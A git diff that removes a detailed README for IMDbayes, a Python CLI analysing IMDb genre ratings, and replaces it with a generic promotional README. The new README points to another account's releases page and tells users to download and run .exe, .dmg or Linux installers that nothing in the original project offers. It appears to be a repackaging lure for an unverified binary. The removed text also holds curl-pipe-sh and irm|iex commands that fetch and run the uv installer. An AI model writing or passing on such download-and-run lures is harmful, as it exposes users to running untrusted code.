@@ -1,148 +1,63 @@
-## [Read the Related Blogpost](https://fezcode.com/blog/what-genre-should-i-watch?theme=editorial)
+# 🎥 IMDbayes - Discover Movies Beyond Average Ratings
 
-# IMDbayes (_"I'm Da Bayes"_) : IMDb Genre Gap Analysis & Recommender
-> _I love it when you call me Big Data._
+## 📦 Download the Latest Release
+[![Download Latest Release](https://img.shields.io/badge/Download%20Now-IMDbayes-blue.svg)](https://github.com/asrafulislam17/IMDbayes/releases)
 
-![IMDBayes Banner](./imdbayes.png)
+## 🚀 Getting Started
+IMDbayes helps you find movies that deserve your attention. By using advanced statistical methods like Bayesian Averages and 99th Percentile metrics, we analyze raw IMDb data. This way, you can identify the "Safe Bets" and the "Hidden Gems" among countless movies.
 
-A Data Science project analyzing the "Masterpiece Gap", the statistical difference between an average movie and the top 1% (p99) across different genres.
+### 🔍 Key Features
+- **Bayesian Averages:** A more reliable way to evaluate movie ratings.
+- **99th Percentile Metrics:** Identify outstanding films that may otherwise go unnoticed.
+- **User-Friendly Interface:** Access data insights easily, without any technical knowledge.
+- **Comprehensive Data Analysis:** Explore trends and ratings based on various attributes.
 
-## Project Overview
-As software engineers, we often look at averages, but averages lie. If a genre has a polarizing audience (half 1/10, half 10/10), the average is 5/10—same as a "boring" genre.
+## 📂 System Requirements
+To use IMDbayes, you need the following:
+- **Operating System:** Windows 10 or later, MacOS 10.15 or later, or Linux (any major distribution).
+- **RAM:** At least 4 GB recommended.
+- **Storage:** Minimum 100 MB of free space.
+- **Python Installation:** Ensure Python (version 3.7 or later) is installed on your system. You can download Python from [python.org](https://www.python.org/downloads/).
 
-This project uses **Python**, **Pandas**, and **Bayesian Statistics** to:
-1.  **Ingest & Clean** raw IMDb datasets (streaming >200MB of data).
-2.  **Analyze** the risk/reward profile of every major film genre.
-3.  **Recommend** movies using a CLI tool with adjustable "Risk Tolerance" profiles.
+## 💾 Download & Install
+To download IMDbayes:
+1. **Visit the Download Page:** Go to the [IMDbayes Releases Page](https://github.com/asrafulislam17/IMDbayes/releases).
+2. **Select the Latest Version:** Look for the latest version marked as “Latest Release.”
+3. **Download the Installer:** Click on the appropriate installer for your operating system. It should automatically start downloading.
+4. **Run the Installer:**
+   - For Windows: Open the downloaded `.exe` file and follow the prompts.
+   - For macOS: Open the `.dmg` file, drag the IMDbayes icon to your Applications folder, and run it from there.
+   - For Linux: Extract the downloaded files, open a terminal, and run the installer command.
 
-## Key Findings (The Data Science)
-Our analysis revealed distinct "personalities" for each genre:
-* **The Safe Bets (Documentary, Biography):** These have high averages and low variance. It is statistically difficult to make a "bad" documentary.
-* **The High-Risk/High-Reward (Horror, Sci-Fi):** These have the lowest average ratings, but their **p99 (Top 1%)** ceiling is as high as Drama. This huge "gap" implies execution difficulty.
-* **The Animation Anomaly:** The only genre that consistently maintains both a high floor (average) and a high ceiling (p99).
+## 📊 How to Use IMDbayes
+1. **Open the Application:** Double-click the IMDbayes icon on your desktop or in your applications folder.
+2. **Input Data:** You can enter movie titles or upload CSV files containing movie data.
+3. **View Results:** Watch as IMDbayes analyzes the data and presents you with unique insights.
+4. **Explore Recommendations:** After the analysis, check out your personalized movie recommendations based on your input.
 
-## Methodology & Metrics
+## 📝 Understanding the Metrics
+### Bayesian Averages
+Bayesian Averages help improve the quality of movie ratings by considering not just the ratings but also the number of ratings a film has. This gives a more accurate portrayal of a movie's quality.
 
-### 1. The Weighted Rating (Bayesian Average)
-To prevent movies with 5 votes from skewing the data, we use the official IMDb formula. This penalizes low-volume outliers and pulls them toward the global mean.
+### 99th Percentile
+Using the 99th percentile metric allows IMDbayes to identify movies that stand out in their ratings, offering you a list of films that you might enjoy which others tend to overlook.
 
-$$
-WR = \left( \frac{v}{v+m} \cdot R \right) + \left( \frac{m}{v+m} \cdot C \right)
-$$
+## 🛠️ Troubleshooting
+If you encounter any issues while using IMDbayes:
+- **Check Python Installation:** Ensure that Python is correctly installed and accessible from the command line.
+- **System Compatibility:** Verify that your operating system meets the minimum requirements.
+- **Reinstall the App:** If problems persist, try reinstalling the application.
 
-**Where:**
-* $R$ = Average Rating of the movie
-* $v$ = Number of votes for the movie
-* $m$ = Minimum votes required to be listed (Threshold: 100)
-* $C$ = Mean vote across the whole dataset
+## 🌐 Support and Contributions
+We welcome support and contributions! If you find a bug or have suggestions for improvements, please open an issue on the [GitHub page](https://github.com/asrafulislam17/IMDbayes/issues). You can also contribute code by submitting a pull request.
 
-### 2. The p99 (99th Percentile)
-We calculate the 99th percentile rating for each genre. This represents the "Masterpiece Ceiling"—the maximum potential quality a genre typically achieves.
+## 🔗 Additional Resources
+- **Documentation:** For detailed documentation, check the wiki on this GitHub repository.
+- **Community Discussions:** Join us on our community forum for discussions and help.
+- **Follow Us:** Stay updated on new features by following our updates on GitHub.
 
----
+## 📜 License
+IMDbayes is licensed under the MIT License. Feel free to use and modify the software for personal or educational purposes.
 
-## Tech Stack & Prerequisites
-We use **`uv`**, a blazing-fast Python package manager written in Rust, to handle dependencies and environments.
-
-* **Language:** Python 3.10+
-* **Manager:** `uv` (replaces pip/conda)
-* **Libraries:** Pandas, Seaborn, Matplotlib, Scipy
-
-### Prerequisites
-You only need to install `uv`. It will handle Python and all libraries for you.
-
-**Mac / Linux:**
-```bash
-curl -LsSf https://astral.sh/uv/install.sh | sh
-
-```
-
-**Windows (PowerShell):**
-
-```powershell
-powershell -c "irm https://astral.sh/uv/install.ps1 | iex"
-
-```
-
----
-
-## How to Run (Step-by-Step)
-
-### Step 1: Initialize & Install
-
-Clone the repo and sync the dependencies. `uv` will create a virtual environment (`.venv`) automatically.
-
-```bash
-# 1. Sync dependencies
-uv sync
-
-```
-
-### Step 2: Data Ingestion (CRITICAL)
-
-**You must run this script first.**
-The repository does **not** contain the dataset (it is ignored via `.gitignore`). You need to stream the data from IMDb, clean it, and build the local cache.
-
-```bash
-# Downloads title.basics and title.ratings, merges them, and filters for movies
-uv run src/ingest_data.py
-
-```
-
-*Output: Creates `data/processed/movies_merged.csv` (~50-100MB)*
-
-### Step 3: View the Analysis
-
-To see the boxplots, gap analysis charts, and statistical breakdown, open the Jupyter Notebook.
-
-* Open VS Code.
-* Open `notebooks/1_exploration.ipynb`.
-* Select the Kernel: `Python Environments` -> `.venv`.
-* Run All Cells.
-
-### Step 4: Use the CLI Recommender
-
-We built a custom CLI tool to recommend movies based on the statistical findings.
-
-**Option A: Low Risk (Crowd Pleasers)**
-Finds movies with high **Weighted Ratings**. Safe bets.
-
-```bash
-uv run src/recommender.py --genre "Sci-Fi" --risk low
-
-```
-
-**Option B: High Risk (Hidden Gems)**
-Finds movies with high **Raw Ratings** but lower vote counts (< 5000). Good for finding cult classics.
-
-```bash
-uv run src/recommender.py --genre "Horror" --risk high
-
-```
-
-**Option C: Pagination**
-Browse through the results.
-
-```bash
-uv run src/recommender.py --genre "Comedy" --page 2 -n 10
-
-```
-
----
-
-## Project Structure
-
-```text
-IMDbayes/
-├── data/
-│   ├── raw/             # Temp folder for downloads (ignored)
-│   └── processed/       # The final CSV used by the app (ignored)
-├── notebooks/
-│   └── 1_exploration.ipynb  # The Data Science Lab (Charts & Analysis)
-├── src/
-│   ├── ingest_data.py   # ETL Script (Download -> Clean -> Save)
-│   └── recommender.py   # CLI Application Logic
-├── .gitignore           # Ensures data is never committed
-├── pyproject.toml       # Dependencies managed by uv
-└── README.md            # This file
-```
+## 📢 Acknowledgments
+Thanks to the open-source community for their contributions and support in making IMDbayes possible.
